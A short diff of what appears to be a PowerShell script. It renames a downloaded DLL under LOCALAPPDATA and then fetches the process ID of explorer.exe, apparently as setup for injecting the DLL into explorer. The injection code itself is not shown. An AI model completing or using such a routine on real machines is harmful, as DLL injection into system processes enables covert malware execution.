@@ -1,5 +1,5 @@
 # Define the path to the downloaded DLL
-$path = "$env:LOCALAPPDATA\DownloadedFolder\ANCIENT_CANVAS.dll"
+$path = "$env:LOCALAPPDATA\DownloadedFolder\COHERENT_GOGGLES.dll"
 
 # Get the process ID of explorer.exe
 $explorerProcess = Get-Process explorer | Select-Object -First 1
